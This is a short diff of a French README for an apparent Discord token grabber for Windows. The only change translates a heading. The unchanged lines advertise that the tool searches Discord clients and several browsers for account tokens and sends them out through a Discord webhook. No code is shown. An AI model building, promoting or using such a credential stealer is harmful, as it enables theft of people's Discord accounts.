@@ -3,7 +3,7 @@
 
 Le version de se grabber est uniquement disponible sur **Windows**.
 
-# Features
+# Fonctionnalités
  - Pas de crashs
  - Transfers via votre webook Discord
  - Cherche le token dans plusieurs répertoires (Discord, Discord PTB, Discord Canary, Google chrome, Opera, Brave and Yandex)
